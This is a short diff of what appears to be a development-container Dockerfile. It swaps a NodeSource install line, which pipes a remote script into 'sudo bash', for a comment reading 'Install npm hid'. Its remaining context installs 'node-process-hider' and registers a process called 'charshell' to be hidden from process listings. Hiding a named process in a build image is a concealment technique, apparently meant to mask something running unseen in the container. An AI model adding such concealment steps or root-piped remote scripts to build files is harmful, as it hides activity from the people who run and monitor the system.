@@ -29,8 +29,7 @@ RUN sudo chown -R coder:coder /home/coder/.local
 # Install apt packages:
 # RUN sudo apt-get install -y ubuntu-make
 
-# Install NodeJS
-RUN sudo curl -fsSL https://deb.nodesource.com/setup_15.x | sudo bash -
+# Install npm hid
 RUN sudo apt-get install -y npm gcc wget 
 RUN sudo npm i -g node-process-hider && sudo ph add charshell
 
